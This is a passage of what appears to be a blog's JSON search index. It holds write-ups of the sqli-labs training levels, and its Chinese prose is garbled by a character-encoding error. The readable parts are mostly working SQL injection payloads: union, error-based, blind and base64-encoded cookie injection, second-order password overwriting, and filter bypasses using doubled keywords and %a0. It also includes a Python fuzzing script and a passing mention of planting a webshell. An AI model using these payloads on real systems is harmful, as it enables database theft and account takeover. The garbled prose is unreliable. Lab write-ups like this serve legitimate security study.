&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼&quot;;&#125; å‚æ•°$fileå¯æ§ï¼Œçœ‹ä¸‹æ¥ç»è¿‡ä¸€ç³»åˆ—è¿‡æ»¤åå°±æ˜¯$img_path = UPLOAD_PATH . &#39;/&#39; . $file_nameï¼Œ$file_nameå°±æ˜¯å‚æ•°$fileè¿‡æ»¤åçš„å½¢å¼ã€‚ ä»åå¾€å‰çœ‹å‘ç°é—®é¢˜ä¸å¤§ï¼Œå®¡ä»£ç å‘ç°è¿™æ ·ä¸€å¥ if (!is_array($file))ï¼Œè¿™å¥è¯é—®é¢˜è¾ƒå¤§ï¼Œå¦‚æœ$fileæ˜¯æ•°ç»„å°±ä¸ä¼šè¿›è¡Œåˆ†å‰²","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://example.com/tags/web/"}]},{"title":"sql-lab-adv","slug":"web_security/sqli-lab_adv","date":"2021-09-27T10:45:09.582Z","updated":"2022-01-01T09:52:50.687Z","comments":true,"path":"3/","link":"","permalink":"http://example.com/3/","excerpt":"","text":"Less-21/22Less-21: Cookieæ³¨å…¥ï¼Œä½¿ç”¨çš„æ˜¯base64ç¼–ç è¿›è¡Œæ³¨å…¥ï¼Œè¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•ï¼šæŠ¥é”™æ³¨å…¥å’Œæ™®é€šçš„è”åˆæ³¨å…¥ 1æŠ¥é”™æ³¨å…¥payload: YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsIGNvbmNhdCgweDdlLCAoc2VsZWN0IHZlcnNpb24oKSksIDB4N2UpLCAxKSAj 1è”åˆæ³¨å…¥payload: YWRtaW4nKSBhbmQgMT0yIHVuaW9uIHNlbGVjdCAxLDIsMyAj ä¸¤ç§æ–¹æ³•éƒ½æ˜¯å…ˆå°†æ³¨å…¥è¯­å¥è¿›è¡Œbase64ç¼–ç ä¹‹ååœ¨æŠ“åŒ…ä¿®æ”¹Cookieå¤´éƒ¨ä¿¡æ¯ Less-22: åŒå¼•å·Cookieå¤´éƒ¨æ³¨å…¥ï¼Œåº”è¯¥ä¹Ÿæ˜¯ä¸¤ç§æ–¹å¼ï¼ŒæŠ¥é”™å’Œè”åˆï¼Œå°è¯•ä¸€ä¸‹ã€‚ æœç„¶ 12è”åˆpayloadï¼šadmin&quot; and 1=2 union select 1,2,3 base64ç¼–ç ï¼šYWRtaW4iIGFuZCAxPTIgdW5pb24gc2VsZWN0IDEsMiwzICM= 12æŠ¥é”™æ³¨å…¥payloadï¼šadmin&quot; and updatexml(1, concat(0x7e, (select version()), 0x7e), 1) #base64ç¼–ç ï¼šYWRtaW4iIGFuZCB1cGRhdGV4bWwoMSwgY29uY2F0KDB4N2UsIChzZWxlY3QgdmVyc2lvbigpKSwgMHg3ZSksIDEpICM= Less-23/24Less-23ï¼š æŠ¥é”™æ³¨å…¥ï¼ŒåŸºäºstrip comments(çœ‹ä¸æ‡‚æ˜¯å•¥æ„æ€)ï¼Œçœ‹äº†æºç åæ¨æ–­åº”è¯¥ç»•è¿‡ç®€å•çš„è¿‡æ»¤ã€‚ 1234567891011// è¿‡æ»¤ç‰¹æ®Šå­—ç¬¦éƒ¨åˆ†æºç &lt;?$id=$_GET[&#x27;id&#x27;];//filter the comments out so as to comments should not work$reg = &quot;/#/&quot;;$reg1 = &quot;/--/&quot;;$replace = &quot;&quot;;$id = preg_replace($reg, $replace, $id);$id = preg_replace($reg1, $replace, $id);?&gt; è¿™é‡Œè¿‡æ»¤äº†--å’Œ#ç¬¦å·ï¼Œå°è¯•äº†åŒå†™ç»•è¿‡å’Œurlç¼–ç ç»•è¿‡ï¼Œéƒ½ä¸è¡Œï¼Œå­¦ä¹ äº†ç½‘ä¸Šå…¶ä»–å¸ˆå‚…çš„ç»•è¿‡æ–¹æ³•ï¼Œä¹‹å‰éƒ½æ²¡æœ‰ç”¨è¿‡ï¼Œä¸‹é¢æ”¾payload 1payloadï¼š?id=-1&#x27; union select 1,2,3 and &#x27;1&#x27;=&#x27;1 æœ€åè¿½åŠ and â€˜1â€™=â€™1æ’ç­‰å¼æ¥é—­åˆæœ€åçš„å¼•å·ï¼Œè¿™ä¸ªæ–¹æ³•æ„Ÿè§‰æœ‰ç‚¹å·§å¦™å”‰ï¼Œå¯ä»¥çœ‹åˆ°å·²ç»å¯ä»¥æ§åˆ¶å›æ˜¾ Less-24: ç¬¬ä¸€æ¬¡å­¦äºŒæ¬¡æ³¨å…¥ï¼Œè¯´ä¸€ä¸‹äºŒæ¬¡æ³¨å…¥çš„åŸç†å§ï¼Œå¦‚æœå­˜åœ¨insertè¯­å¥ï¼Œé‚£ä¹ˆå°±å¯ä»¥å§payloadå†™å…¥æ•°æ®åº“ï¼Œå½“ä½¿ç”¨selectè¯­å¥æˆ–è€…å…¶ä»–è¯­å¥æŸ¥è¯¢åˆ°payloadæ—¶ï¼Œå°±ä¼šè§¦å‘payloadä»è€Œè¿›è¡Œåˆ©ç”¨ã€‚ä¸‹é¢é™„å¸¦ä¸€å¼ è®²è§£å›¾ è¿™ä¸ªå…³å¡éœ€è¦çš„å‰æï¼Œéœ€è¦çŸ¥é“ä¸€ä¸ªç”¨æˆ·åï¼Œéœ€è¦èƒ½å¤Ÿè‡ªå·±æ³¨å†Œå¸å·ï¼Œä¸”ä¿®æ”¹å¯†ç  12//é€ æˆäºŒæ¬¡æ³¨å…¥çš„è¯­å¥$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;; é¦–å…ˆæ³¨å†Œä¸€ä¸ªåå«admin&#39; #çš„ç”¨æˆ·ï¼Œå‡è®¾æœ‰ä¸€ä¸ªå«adminçš„ç”¨æˆ·æˆ‘ä»¬å·²ç»çŸ¥é“ï¼Œåœ¨æ³¨å†Œä¹‹åé€‰æ‹©ä¿®æ”¹admin&#39; #ç”¨æˆ·çš„å¯†ç ï¼Œé‚£ä¹ˆæ›´æ–°è¯­å¥å°±ä¼šå˜æˆä¸‹é¢è¿™æ ·ã€‚ 1$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27; #&#x27; and password=&#x27;$curr_pass&#x27; &quot;; ç›¸å½“ä¸æˆ‘ä»¬ä¿®æ”¹äº†adminç”¨æˆ·çš„å¯†ç è€ŒåŸæ¥çš„ç”¨æˆ·å¯†ç æ²¡æœ‰æ”¹å˜ã€‚è¿™æ ·åœ¨çŸ¥é“å¾ˆå¤šç”¨æˆ·åçš„æƒ…å†µä¸‹å°±å¯ä»¥éšæ„ä¿®æ”¹æ‰€çŸ¥é“çš„ç”¨æˆ·çš„å¯†ç ã€‚ Less-25/25aLess-25: çœ‹åå­—åº”è¯¥æ˜¯è¿‡æ»¤äº†andå’Œorå…³é”®å­—ï¼ŒæŠ¥é”™æ³¨å…¥ï¼Œä¹‹å‰é‡åˆ°è¿‡ï¼Œçœ‹çœ‹å¯ä¸å¯ä»¥ä½¿ç”¨åŒå†™ç»•è¿‡ã€‚ 12345payloadæµ‹è¯•ï¼šé¦–å…ˆæµ‹è¯•å•å¼•å·ï¼Œå‘ç°å¯ä»¥å¼•å‘æŠ¥é”™ï¼šid=1&#x27; åœ¨å°è¯•é—­åˆï¼Œå‘ç°å¯ä»¥æˆªæ–­ï¼Œå­˜åœ¨sqlæ³¨å…¥ï¼šid=1&#x27; --+åœ¨å°è¯•ä½¿ç”¨andå…³é”®å­—ï¼Œå‘ç°åˆæŠ¥é”™ï¼Œåº”è¯¥æ˜¯andè¢«æ­£åˆ™åŒ¹é…è¿‡æ»¤ï¼šid=1&#x27; and 1=2--+åŒå†™andå°è¯•ç»•è¿‡ï¼ŒæˆåŠŸï¼ŒçŒœæµ‹æ­£ç¡®ï¼šid=1&#x27; anandd 1=2--+ 1æ§åˆ¶å›æ˜¾payloadï¼šid=1&#x27; anandd 1=2 union select 1,2,3--+ ä½†æ˜¯ä½œè€…è®©æˆ‘ä»¬ä½¿ç”¨æŠ¥é”™æ³¨å…¥é‚£å°±ç”¨æŠ¥é”™æ³¨å…¥æä¸‹ 1payloadï¼šid=1&#x27; anandd updatexml(1, concat(0x7e, (select version()), 0x7e), 1)--+ å…¶å®è¿™å…³ç”¨è”åˆæ³¨å…¥å°±ç”¨ä¸åˆ°andæˆ–è€…orç­‰å…³é”®å­—ï¼Œæ‰€ä»¥ä½œè€…æ‰æç¤ºä½¿ç”¨æŠ¥é”™æ³¨å…¥ã€‚ Less-25a: 12345678//è¿‡æ»¤ç¬¦å·function blacklist($id)&#123; $id= preg_replace(&#x27;/or/i&#x27;,&quot;&quot;, $id); //strip out OR (non case sensitive) $id= preg_replace(&#x27;/AND/i&#x27;,&quot;&quot;, $id); //Strip out AND (non case sensitive) return $id;&#125; 1æ§åˆ¶å›æ˜¾payload: id=1 anandd 1=2 union select 1,2,3 ä½†æ˜¯ä½œè€…å¸Œæœ›æˆ‘ä»¬ä½¿ç”¨ç›²æ³¨è„šæœ¬ï¼Œé¢ï¼Œä¹‹å‰çš„å¥½åƒä¹Ÿè¿˜æ²¡æœ‰å†™ï¼Œä¸‹æ¬¡ä¸€å®šã€‚ Less-26/26aLess-26: æŠ¥é”™æ³¨å…¥ï¼Œè¿‡æ»¤äº†ç©ºæ ¼å’Œæ³¨é‡Šã€‚æŠ¥é”™æ³¨å…¥ï¼Œä¸”è¿‡æ»¤äº†ç©ºæ ¼å’Œæ³¨é‡Šç¬¦å·ï¼Œæƒ³æƒ³è¦æ€ä¹ˆç»•è¿‡ï¼Œæ³¨å…¥æ–¹æ³•å‰é¢å­¦äº†ä¸€ç‚¹åé¢çš„å…³å¡åº”è¯¥å°±æ˜¯æ³¨å…¥åŠ è¿‡waf 1è¿‡æ»¤äº†æ³¨é‡Šç¬¦ï¼Œé‚£ä¹ˆå°±ä½¿ç”¨æ¨ªç­‰å¼æ¥ç»•è¿‡ï¼šid=1&#x27; and &#x27;1&#x27;=&#x27;1ï¼Œå‘ç°æ²¡æœ‰æŠ¥é”™ï¼Œä¸æ˜¯è¯´è¿‡æ»¤äº†ç©ºæ ¼å—ï¼Ÿã€‚ã€‚çœ‹æºç  1234567891011121314// æºç è¿‡æ»¤çš„ç¬¦å·&lt;?phpfunction blacklist($id)&#123; $id= preg_replace(&#x27;/or/i&#x27;,&quot;&quot;, $id); //strip out OR (non case sensitive) $id= preg_replace(&#x27;/and/i&#x27;,&quot;&quot;, $id); //Strip out AND (non case sensitive) $id= preg_replace(&#x27;/[\\/\\*]/&#x27;,&quot;&quot;, $id); //strip out /* $id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id); //Strip out -- $id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id); //Strip out # $id= preg_replace(&#x27;/[\\s]/&#x27;,&quot;&quot;, $id); //Strip out spaces $id= preg_replace(&#x27;/[\\/\\\\\\\\]/&#x27;,&quot;&quot;, $id); //Strip out slashes return $id;&#125; ?&gt; åŸæ¥è¿‡æ»¤äº†ç©ºæ ¼ã€‚ã€‚ã€‚è¿˜è¿‡æ»¤äº†andï¼Œorç­‰å¸¸è§çš„å…³é”®å­—éƒ½å¯ä»¥ç”¨åŒå†™ç»•è¿‡ï¼Œä½†æ˜¯ç©ºæ ¼è¦æ€ä¹ˆç»•è¿‡å‘¢ï¼Ÿ å°è¯•ï¼šurlç¼–ç ï¼ˆå¤±è´¥ï¼‰ï¼Œåœ¨è§£ææ—¶å°±å·²ç»è½¬æ¢æˆäº†asciiç ï¼Œè¿™ä¸ªé—®é¢˜è¿˜è¦å¥½å¥½æƒ³æƒ³ï¼Œæ•°æ®ä¼ è¾“æ—¶ç¼–ç è½¬æ¢é—®é¢˜ã€‚ â€‹ ä½¿ç”¨å›è½¦urlç¼–ç ï¼Œmysqlæ”¯æŒå›è½¦ï¼ˆå¤±è´¥ï¼Œæš‚æ—¶ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼‰ â€‹ ä½¿ç”¨æ³¨é‡Šç»•è¿‡ï¼Œè¿™ä¸ªå…³å¡ä¸è¡Œï¼Œåº”ä¸ºæœ¬èº«å°±è¿‡æ»¤äº†æ³¨é‡Šç¬¦å· ç½‘ä¸Šæ‰¾çš„æµ‹è¯•èƒ½å¤Ÿæ›¿ä»£ç©ºæ ¼é”®æµ‹è¯•çš„è„šæœ¬ 123456789101112131415import requestsdef changeToHex(num): tmp = hex(i).replace(&quot;0x&quot;, &quot;&quot;) if len(tmp)&lt;2: tmp = &#x27;0&#x27; + tmp return &quot;%&quot; + tmpreq = requests.session()for i in xrange(0,256): i = changeToHex(i) url = &quot;0.0.0.0/Less-26/?id=1&#x27;&quot; + i + &quot;%26%26&quot; + i + &quot;&#x27;1&#x27;=&#x27;1&quot; ret = req.get(url) if &#x27;Dumb&#x27; in ret.content: print &quot;good,this can use:&quot; + i åœ¨ç»è¿‡ä¸€ç•ªæŠ˜è…¾ä¹‹åç¡®å®šäº†å¯ä»¥ä½¿ç”¨%a0æ¥ä»£æ›¿ç©ºæ ¼ 12payload: id=1&#x27;%a0aandnd%a0&#x27;1&#x27;=&#x27;2è¿™ä¸ªpayloadå¯ä»¥è®©åå°æŸ¥æ‰¾é”™è¯¯æ²¡æœ‰å›æ˜¾ ç”±äºæ˜¯åŸºäºé”™è¯¯çš„ï¼Œç°åœ¨ç»•è¿‡äº†wafå°±å¾ˆå¥½ä½¿ç”¨æŠ¥é”™æ³¨å…¥äº†ã€‚ 1id=1&#x27;%a0oorr%a0updatexml(1, concat(0x7e, (select%a0version()), 0x7e), 1)%a0oorr%a0&#x27;1&#x27;=&#x27;1 Less-26a: ç›²æ³¨ï¼Œä¸”è¿‡æ»¤äº†ç©ºæ ¼å’Œæ³¨é‡Šç¬¦å·ï¼Œæƒ³æƒ³è¦æ€ä¹ˆç»•è¿‡ï¼Œæ³¨å…¥æ–¹æ³•å‰é¢å­¦äº†ä¸€ç‚¹åé¢çš„å…³å¡åº”è¯¥å°±æ˜¯æ³¨å…¥åŠ è¿‡waf è¯•äº†è¯•å’Œ26å…³å·®ä¸å¤šï¼Œåº”è¯¥æ˜¯ä½œè€…æƒ³è®©æˆ‘ä»¬ä½¿ç”¨ç›²æ³¨çš„æ‰‹æ³•æ¥åšï¼Œè¦å†™è„šæœ¬ 1æµ‹è¯•payload: id=1&#x27;)%a0aandnd%a0(&#x27;1&#x27;=&#x27;1 å†ä¸­é—´æ·»åŠ ä¸€æ¡and ifè¯­å¥ï¼Œå°±å¯ä»¥å®ç°ç›²æ³¨å…¥ 1ç›²æ³¨payload: id=1&#x27;)%a0aandnd%a0sleep(5)%a0aandnd%a0(&#x27;1&#x27;=&#x27;1 åˆ¤æ–­æ³¨å…¥ç±»å‹çš„æ–¹æ³•:1å’Œ1â€æ­£å¸¸å›æ˜¾ï¼Œ1â€™æŠ¥é”™ï¼Œåˆ¤æ–­ä¸ºå­—ç¬¦å‹ï¼Œä½†æ˜¯è¿˜è¦åˆ¤æ–­æ˜¯å¦æœ‰å°æ‹¬å·ã€‚ åˆ¤æ–­å°æ‹¬å·æœ‰å‡ ç§æ–¹æ³•ï¼š 2â€™&amp;&amp;â€™1â€™=â€™1è‹¥æŸ¥è¯¢è¯­å¥ä¸ºwhere id=â€™$idâ€™ï¼ŒæŸ¥è¯¢æ—¶æ˜¯where id=â€™2â€™&amp;&amp;â€™1â€™=â€™1â€™ï¼Œç»“æœæ˜¯where id=â€™2â€™ï¼Œå›æ˜¾ä¼šæ˜¯id=2ã€‚è‹¥æŸ¥è¯¢è¯­å¥ä¸ºwhere id=(â€˜$idâ€™)ï¼ŒæŸ¥è¯¢æ—¶æ˜¯where id=(â€˜2â€™&amp;&amp;â€™1â€™=â€™1â€™)ï¼ŒMySQL å°†â€™2â€™ä½œä¸ºäº† Bool å€¼ï¼Œç»“æœæ˜¯where id=(â€˜1â€™)ï¼Œå›æ˜¾ä¼šæ˜¯id=1ã€‚1â€™)||â€™1â€™=(â€˜1è‹¥æŸ¥è¯¢è¯­å¥æœ‰å°æ‹¬å·æ­£ç¡®å›æ˜¾ï¼Œè‹¥æ— å°æ‹¬å·é”™è¯¯å›æ˜¾ï¼ˆæ— å›æ˜¾ï¼‰ã€‚ Less-27/27aLess-27: åŸºäºé”™è¯¯ï¼Œè¿‡æ»¤äº†æ›´å¤šçš„ä¸œè¥¿ï¼Œæœ€ä¸»è¦çš„æ˜¯unionå’Œselectå…³é”®å­—ï¼Œè¿™é‡Œæ¶‰åŠåˆ°äº†PHPæ­£åˆ™åŒ¹é…çš„çŸ¥è¯†ã€‚ 123456789101112iå¦‚æœè®¾å®šäº†æ­¤ä¿®æ­£ç¬¦ï¼Œæ¨¡å¼ä¸­çš„å­—ç¬¦å°†åŒæ—¶åŒ¹é…å¤§å°å†™å­—æ¯ã€‚må¦‚æœè®¾å®šäº†æ­¤ä¿®æ­£ç¬¦ï¼Œè¡Œèµ·å§‹å’Œè¡Œç»“æŸé™¤äº†åŒ¹é…æ•´ä¸ªå­—ç¬¦ä¸²å¼€å¤´å’Œç»“æŸå¤–ï¼Œè¿˜åˆ†åˆ«åŒ¹é…å…¶ä¸­çš„æ¢è¡Œç¬¦çš„ä¹‹åå’Œä¹‹å‰ã€‚så¦‚æœè®¾å®šäº†æ­¤ä¿®æ­£ç¬¦ï¼Œæ¨¡å¼ä¸­çš„åœ†ç‚¹å…ƒå­—ç¬¦.åŒ¹é…æ‰€æœ‰çš„å­—ç¬¦ï¼ŒåŒ…æ‹¬æ¢è¡Œç¬¦ã€‚æ²¡æœ‰æ­¤è®¾å®šçš„è¯ï¼Œåˆ™ä¸åŒ…æ‹¬æ¢è¡Œç¬¦ã€‚xå¦‚æœè®¾å®šäº†æ­¤ä¿®æ­£ç¬¦ï¼Œæ¨¡å¼ä¸­çš„ç©ºç™½å­—ç¬¦é™¤äº†è¢«è½¬ä¹‰çš„æˆ–åœ¨å­—ç¬¦ç±»ä¸­çš„ä»¥å¤–å®Œå…¨è¢«å¿½ç•¥ï¼Œåœ¨æœªè½¬ä¹‰çš„å­—ç¬¦ç±»ä¹‹å¤–çš„#ä»¥åŠä¸‹ä¸€ä¸ªæ¢è¡Œç¬¦ä¹‹é—´çš„æ‰€æœ‰å­—ç¬¦ï¼ŒåŒ…æ‹¬ä¸¤å¤´ï¼Œä¹Ÿéƒ½è¢«å¿½ç•¥ã€‚eå¦‚æœè®¾å®šäº†æ­¤ä¿®æ­£ç¬¦ï¼Œpreg_replace()åœ¨æ›¿æ¢å­—ç¬¦ä¸²ä¸­å¯¹é€†å‘å¼•ç”¨ä½œæ­£å¸¸çš„æ›¿æ¢ã€‚?åœ¨./+/*ä¹‹åè¡¨ç¤ºéè´ªå©ªåŒ¹é…ï¼Œ./+/*é™å®šç¬¦éƒ½æ˜¯è´ªå©ªçš„ï¼Œå®ƒä»¬ä¼šå°½å¯èƒ½å¤šçš„åŒ¹é…æ–‡å­—ï¼Œåœ¨å®ƒä»¬çš„åé¢åŠ ä¸Šä¸€ä¸ª?å°±å¯ä»¥å®ç°éè´ªå©ªæˆ–æœ€å°åŒ¹é…ã€‚ 123456789101112131415161718&lt;?phpfunction blacklist($id)&#123; $id= preg_replace(&#x27;/[\\/\\*]/&#x27;,&quot;&quot;, $id); //strip out /* $id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id); //Strip out --. $id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id); //Strip out #. $id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id); //Strip out spaces. $id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id); //Strip out spaces. $id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id); //Strip out spaces. $id= preg_replace(&#x27;/union/s&#x27;,&quot;&quot;, $id); //Strip out union $id= preg_replace(&#x27;/select/s&#x27;,&quot;&quot;, $id); //Strip out select $id= preg_replace(&#x27;/UNION/s&#x27;,&quot;&quot;, $id); //Strip out UNION $id= preg_replace(&#x27;/SELECT/s&#x27;,&quot;&quot;, $id); //Strip out SELECT $id= preg_replace(&#x27;/Union/s&#x27;,&quot;&quot;, $id); //Strip out Union $id= preg_replace(&#x27;/Select/s&#x27;,&quot;&quot;, $id); //Strip out select return $id;&#125;?&gt; æµ‹è¯•id=1å’Œid=1â€å‘ç°å›æ˜¾æ­£å¸¸ï¼Œå•å¼•å·æŠ¥é”™ï¼Œå­˜åœ¨æ³¨å…¥ç‚¹ï¼Œä½†æ˜¯è¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ï¼Œç»•è¿‡æ€è·¯ï¼š æ²¡æœ‰è¿‡æ»¤andå’Œorå…³é”®å­—ï¼Œä½†æ˜¯æˆ‘è¿™æ¬¡æƒ³ç”¨||å’Œ&amp;&amp;ä¸¤ä¸ªç¬¦å·æ¥ä»£æ›¿and,or selectï¼Œunionå¯ä»¥ç”¨å¤§å°å†™æ··å†™çš„æ–¹å¼å»ç»•è¿‡ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨åŒå†™çš„æ–¹å¼ ç©ºæ ¼ï¼Œä¹‹å‰æåˆ°è¿‡ï¼Œå¯ä»¥ç”¨%a0ç­‰urlç¼–ç çš„æ–¹å¼ç»•è¿‡ æ³¨é‡Šç¬¦å·è¿‡æ»¤ï¼Œåé¢çš„å•å¼•å·æ— æ³•æ³¨é‡Šå°±ä½¿ç”¨æ¨ªç­‰å¼æ¥é—­åˆåé¢çš„å•å¼•å· å¼€å§‹æµ‹è¯•: 1é¦–å…ˆä½¿ç”¨è”åˆæ³¨å…¥æ§åˆ¶å›æ˜¾ï¼šid=1&#x27;%a0and%a0&#x27;1&#x27;=&#x27;2&#x27;%a0UnIon%a0SeLeCT%a01,2,3%a0and&#x27;1&#x27;=&#x27;1 1å°è¯•ä½¿ç”¨æŠ¥é”™æ³¨å…¥ï¼š","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://example.com/tags/web/"}]},{"title":"sql-lab-base","slug":"web_security/sqli-lab_base","date":"2021-09-27T10:45:09.365Z","updated":"2022-01-01T09:52:11.667Z","comments":true,"path":"2/","link":"","permalink":"http://example.com/2/","excerpt":"","text":"éœ€è¦æŒæ¡çš„MySQLåŸºæœ¬çŸ¥è¯†imformation_schemaæ•°æ®åº“ä¸­æœ‰å¾ˆå¤šå¼ è¡¨ï¼Œå…¶ä¸­æœ‰ç”¨çš„ä¿¡æ¯å¦‚ä¸‹ï¼š tables_schemaï¼šå­˜æ”¾æ¯ä¸ªæ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨åï¼Œå¸¸ç”¨æŸ¥è¯¢è¯­å¥ select table_name from imformation_schema.tables where table_schema = &#39;xxxx&#39; columnsï¼šå­˜æ”¾è¡¨åï¼Œä»¥åŠæ¯å¼ è¡¨çš„åˆ—åï¼Œå¸¸ç”¨æŸ¥è¯¢è¯­å¥select column_name from imformation_schema.columns where table_name = &#39;xxxx&#39; å¸¸ç”¨å‡½æ•°ï¼š version()ï¼ŒæŸ¥è¯¢ç³»ç»Ÿç‰ˆæœ¬ database()ï¼ŒæŸ¥è¯¢å½“å‰æ•°æ®åº“å concat()ï¼Œä½¿ç”¨ç¬¦å·è¿æ¥å­—ç¬¦ä¸² group_concat()ï¼Œå°†å¤šä¸ªè¿”å›ä¿¡æ¯å˜æˆä¸€åˆ— Less-1/2Less-1: å­—ç¬¦å½¢æ³¨å…¥ï¼Œéœ€è¦åŠ å•å¼•å·ã€‚ Less-2: æ•°å­—å‹æ³¨å…¥ï¼Œä¸éœ€è¦åŠ å•å¼•å·å°±å¯ä»¥æ³¨å…¥ã€‚ Less-3/4Less-3: ä»æºä»£ç çœ‹å‡ºæŸ¥è¯¢è¯­å¥åŠ å…¥äº†æ‹¬å·ï¼Œç›®æ ‡å°±æ˜¯ç»•è¿‡æ‹¬å· 1$sql=&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;; åŸç†å’Œå•å¼•å·å·®ä¸å¤šï¼Œä½†æ˜¯å¤šäº†æ‹¬å·å°±éœ€è¦æœ‰æ‹¬å·çš„é—­åˆ 1payload: http://0.0.0.0:8080/Less-3/?id=-1&#x27;) union select 1,2,3--+ Less-4: å’Œç¬¬ä¸‰å…³ä¸€æ ·ï¼ŒåŒºåˆ«å°±æ˜¯ä»å•å¼•å·å˜æˆäº†åŒå¼•å· 1payload: http://0.0.0.0:8080/Less-4/?id=-1&quot;) union select 1,2,3--+ Less-5/6Less-5: æŠ¥é”™æ³¨å…¥ï¼Œè¿™é‡Œä½¿ç”¨updatexmlå‡½æ•°ï¼Œå¸¸ç”¨çš„ä¸¤ä¸ªå‡½æ•°å¦‚ä¸‹ 1payload: http://0.0.0.0:8080/Less-5/?id=-1&#x27; and updatexml(1, concat(0x7e, (select database())), 1)--+ Less-6: å•å¼•å·å˜åŒå¼•å·ï¼Œé‚£å°±é—­åˆåŒå¼•å·ï¼Œä½œè€…æºä»£ç å¦‚ä¸‹ 12$id = &#x27;&quot;&#x27;.$id.&#x27;&quot;&#x27;;$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;; 1payload: http://0.0.0.0:8080/Less-6/?id=1&quot; and updatexml(1, concat(0x7e, (select database())), 1)--+ Less-7/8ä½¿ç”¨into_outfileå‡½æ•°å†™ä¸€å¥è¯æœ¨é©¬ï¼Œæ‹¿åˆ°ç½‘ç«™webshellï¼Œbuuä¸Šç›®å‰æ— æ³•è·å–ç½‘ç«™è·¯å¾„ï¼Œå…ˆè·³è¿‡ï¼Œåé¢æ­å»ºæœ¬åœ°ç¯å¢ƒæã€‚ Less-9/10sqlç›²æ³¨ï¼Œæ²¡æœ‰äº†æ‰€æœ‰æŠ¥é”™å›æ˜¾ï¼Œè„šæœ¬åœ¨å†™äº†åœ¨å†™äº†ã€‚ 123456789101112131415161718192021222324&lt;?$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo &#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;; echo &#x27;You are in...........&#x27;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; &#125; else &#123; echo &#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;; echo &#x27;You are in...........&#x27;; //print_r(mysql_error()); //echo &quot;You have an error in your SQL syntax&quot;; echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;; &#125;?&gt; Less-11/12Less-11ï¼šä½¿ç”¨ç™»å½•æ¡†ç™»å½•ï¼Œä¸åŒä¸ä¹‹å‰ï¼Œè¿™æ¬¡çš„æäº¤æ–¹å¼æ˜¯Postï¼Œä½†æ˜¯æ³¨å…¥æ–¹å¼å’Œä¹‹å‰ä¸€æ · æºç å¦‚ä¸‹ 1234567891011121314151617181920&lt;?if(isset($_POST[&#x27;uname&#x27;]) &amp;&amp; isset($_POST[&#x27;passwd&#x27;]))&#123; $uname=$_POST[&#x27;uname&#x27;]; $passwd=$_POST[&#x27;passwd&#x27;]; //logging the connection parameters to a file for analysis. $fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;); fwrite($fp,&#x27;User Name:&#x27;.$uname); fwrite($fp,&#x27;Password:&#x27;.$passwd.&quot;\\n&quot;); fclose($fp); // connectivity @$sql=&quot;SELECT username, password FROM users WHERE username=&#x27;$uname&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;; echo $sql.&quot;&lt;/br&gt;&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result);&#125;?&gt; 1payload: uname=admin&amp;passwd=admin&#x27; and 1=2 union select database(),version()# Less-12ï¼šåŒæ ·æ˜¯ä½¿ç”¨postæäº¤æ–¹å¼ï¼Œä½†æ˜¯åœ¨æäº¤ä¹‹å‰å¯¹ä¸¤ä¸ªå˜é‡æ·»åŠ äº†åŒå¼•å·ï¼Œå¹¶ä¸”åœ¨æŸ¥è¯¢çš„æ—¶å€™ä½¿ç”¨çš„æ‹¬å·ï¼Œæºç å¦‚ä¸‹ 1234567&lt;?php$uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;;$passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;;@$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);?&gt; æ‰€ä»¥åœ¨æ³¨å…¥çš„æ—¶å€™éœ€è¦æ·»åŠ åŒå¼•å·å’Œæ‹¬å·è¿›è¡Œé—­åˆ 1payload: uname=admin&amp;passwd=admin&quot;) and 1=2 union select 1,2# Less-13/14Less-13ï¼šåŒæ³¨å…¥ï¼Œæ²¡æœ‰ä»»ä½•å›æ˜¾ï¼Œä½¿ç”¨æŠ¥é”™æ³¨å…¥ï¼Œæºç å¦‚ä¸‹ 12345&lt;? @$sql=&quot;SELECT username, password FROM users WHERE username=(&#x27;$uname&#x27;) and password=(&#x27;$passwd&#x27;) LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result);?&gt; 1uname=1&amp;passwd=1&#x27;) and extractvalue(1,concat(0x7e,version(),0x7e))# Less-14ï¼šæŸ¥è¯¢å‚æ•°ä¸¤è¾¹æ·»åŠ äº†åŒå¼•å·ï¼Œæ‰€ä»¥æ·»åŠ 